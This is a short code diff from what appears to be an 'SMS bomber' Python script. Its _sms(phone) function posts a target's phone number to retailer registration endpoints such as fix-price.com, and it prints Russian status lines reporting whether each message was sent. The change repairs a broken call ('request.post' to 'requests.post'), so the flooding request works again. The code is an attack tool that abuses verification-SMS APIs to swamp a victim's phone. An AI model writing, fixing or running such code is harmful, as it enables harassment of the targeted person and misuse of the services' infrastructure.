@@ -297,7 +297,7 @@ def _sms(phone):
             print('\n        [\033[31m-\033[33m] сообщение от citilink.ru не отправлено!')
          try:
              x += 1
-             request.post(
+             requests.post(
                 "https://api.fix-price.com/buyer/v2/registration/phone/request", data = {"phone": ph}
             )
             print('\n        [\033[32m+\033[33m] сообщение от fix-price.com отправлено!')
